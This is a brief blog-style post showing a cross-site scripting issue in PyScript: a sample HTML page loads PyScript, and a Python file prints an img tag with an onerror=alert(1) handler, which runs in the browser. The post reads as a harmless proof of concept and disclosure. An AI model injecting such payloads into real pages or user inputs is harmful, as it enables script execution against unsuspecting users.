# Run XSS in Your browser
## With additional steps

## Intro
Sometime ago, I mean week, Anaconda, release the PyScript https://github.com/pyscript/pyscript. Simplifing: The Python in browser, with HTML and JavaScript. Javascript and python, in the browser,. What can possibly can go wrong. 

> :warning: **If you are using mobile browser**: Be very careful here!

## PyScript XSS
Let's check how it works:
index.html
```
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
        <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
    </head>
    <body>
        <py-script src="/test.py"></py-script>
    </body>
</html>
```
test.py
```
print('as<img src=x onerror=alert(1)>df')
```
and here we are, with XSS. 

## Outro
Make no mistake, The PyScript, is brilliant product!
